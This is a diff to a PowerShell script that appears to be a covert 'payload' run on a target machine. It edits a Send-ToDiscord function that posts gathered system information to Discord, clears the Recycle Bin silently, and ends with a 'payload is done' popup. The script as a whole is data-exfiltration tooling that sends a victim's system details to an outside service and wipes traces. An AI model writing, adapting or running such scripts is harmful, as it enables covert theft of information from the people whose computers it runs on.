@@ -424,11 +424,8 @@ function Send-ToDiscord {
     # Debug: Output the message length to the console
     Write-Host "Sending message to Discord. Length: $($Message.Length)"
 
-    # Escape special characters in the message for JSON compatibility
-    $escapedMessage = $Message -replace '\\', '\\\\' -replace '"', '\"' -replace '\n', '\\n' -replace '\r', ''
-
     # Construct the JSON payload
-    $payload = @{ content = "```$escapedMessage```" } | ConvertTo-Json
+    $payload = @{ content = "$Message" } | ConvertTo-Json
 
     try {
         # Send the message to Discord
@@ -439,6 +436,7 @@ function Send-ToDiscord {
         Write-Error $_.Exception.Message
     }
 }
+
 
 
 # Main Script: Gather System Information
@@ -501,4 +499,5 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # Popup message to signal the payload is done
 
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("script is done",1)
+$done = New-Object -ComObject Wscript.Shell
+$done.Popup("script is done",1)
